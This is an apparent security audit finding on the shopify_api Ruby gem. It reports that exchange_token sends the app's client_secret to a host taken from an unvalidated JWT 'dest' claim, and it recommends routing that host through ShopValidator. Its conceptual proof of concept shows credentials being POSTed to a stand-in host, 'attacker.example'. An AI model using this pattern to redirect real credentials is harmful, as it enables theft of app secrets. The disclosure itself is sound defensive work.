## Finding: `TokenExchange.exchange_token` sends the app's `client_secret` to a host derived from an unverified JWT `dest` claim - ([File: lib/shopify_api/auth/token_exchange.rb])

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` builds the token-exchange request host from the `dest` claim of the caller-supplied `session_token`, without ever routing it through `Utils::ShopValidator.sanitize!`. Every sibling method that sends the app's `client_secret` to a shop-derived host (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, `TokenExchange.migrate_to_expiring_token`) explicitly calls `Utils::ShopValidator.sanitize!(shop)` before constructing the request. `exchange_token` breaks that pattern.

### Finding Description
`exchange_token` decodes the caller-supplied `session_token` via `JwtPayload.new(session_token)` and takes `dest_shop = jwt_payload.shop` directly as the request host: [1](#0-0) 

`JwtPayload` only verifies the token's signature against `Context.api_secret_key`/`old_api_secret_key` and checks `aud == Context.api_key`; it does not constrain `dest` to a Shopify domain at all: [2](#0-1) 

`shop` is derived by simply stripping `https://` from `dest`: [3](#0-2) 

`dest_shop` is then used unsanitized as `Auth::Session#shop`, which `Clients::HttpClient` uses verbatim to build the destination host that receives the request containing `client_secret` and `client_id` in the POST body: [4](#0-3) [5](#0-4) 

By contrast, the library's own `ShopValidator` exists specifically to constrain any shop-derived host to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) before it's used to build a request URL carrying the client secret: [6](#0-5) 

and every other credential-bearing flow in this library (`client_credentials`, `refresh_access_token`, `migrate_to_expiring_token`) applies it: [7](#0-6) [8](#0-7) [9](#0-8) 

The identity binding that breaks is: **host that receives the `client_secret` == host validated as a trusted Shopify domain**. In `exchange_token`, the host that receives `client_secret` is bound only to "whatever `dest` string a validly-signed JWT contains," not to a Shopify-domain check. Since `JWT.decode` here only checks signature/`aud`/`exp`/`nbf`, and `dest` is fully attacker-influenced content inside the payload (the signing key is the app's own secret, held by Shopify's backend, so an outside attacker without the secret can't forge the JWT itself) — the actual risk is narrower than a full attacker-controlled analog: this is not exploitable by an unauthenticated internet user without a validly-signed token from Shopify. It is a missing defense-in-depth check relative to the rest of the codebase, but the exploit precondition (a validly-signed JWT with an attacker-chosen `dest`) requires either a Shopify-side issuance bug or reuse of a token type that legitimately allows attacker-influenced `dest` (e.g. checkout/extension tokens, which this codebase's own tests show carry `dest` values like `"test-shop.myshopify.io"` without scheme validation, and worse, without any enforced suffix).

### Impact Explanation
If `dest` in a validly-signed session token can ever contain a non-Shopify host (no code path in this gem enforces it must be `*.myshopify.com`/`*.myshopify.io`/etc.), `exchange_token` will POST the app's `client_id` and `client_secret` directly to that host in `access_token` request body — this is SSRF-with-credentials / `client_secret` exfiltration to an attacker-chosen host, matching the "High - SSRF with the app's credentials... or credential leakage" impact category.

### Likelihood Explanation
Likelihood is constrained by the fact that `session_token` must carry a valid HMAC-SHA256 signature verifiable with the app's own `api_secret_key`/`old_api_secret_key`; an outside unprivileged attacker cannot forge this token from scratch. The exposure only manifests if some legitimately-issued Shopify token (e.g., a checkout/extension-context token, which per `JwtPayload`'s `admin_session_token?` handling is explicitly treated as a different, non-admin token class in this same file) can carry an attacker-influenced `dest`/`iss` value that isn't constrained to Shopify infra. This gem cannot fully verify that constraint itself since it has no visibility into Shopify's token-issuance rules, and I could not confirm from the codebase alone whether such tokens are ever obtainable with attacker-chosen `dest`.

### Recommendation
Route `dest_shop` through `Utils::ShopValidator.sanitize!` (as already done in `migrate_to_expiring_token`, `client_credentials`, and `refresh_access_token`) before constructing `shop_session` and issuing the `access_token` request in `exchange_token`, so the host that receives `client_secret` is always constrained to `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` regardless of what a signed session token's `dest` claim contains.

### Proof of Concept
Conceptual (not independently exploitable without a validly-signed token with attacker-controlled `dest`):
1. Obtain/construct a session token whose `dest` claim is `"https://attacker.example"` but which is otherwise validly signed (precondition not verifiable as reachable purely from this gem's code).
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: ...)`.
3. `JwtPayload#shop` returns `"attacker.example"` unchecked.
4. `Clients::HttpClient` builds `@base_uri = "https://attacker.example"` and POSTs `{client_id, client_secret, ...}` to `https://attacker.example/admin/oauth/access_token`, exfiltrating the app's `client_secret` to the attacker's host.

      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
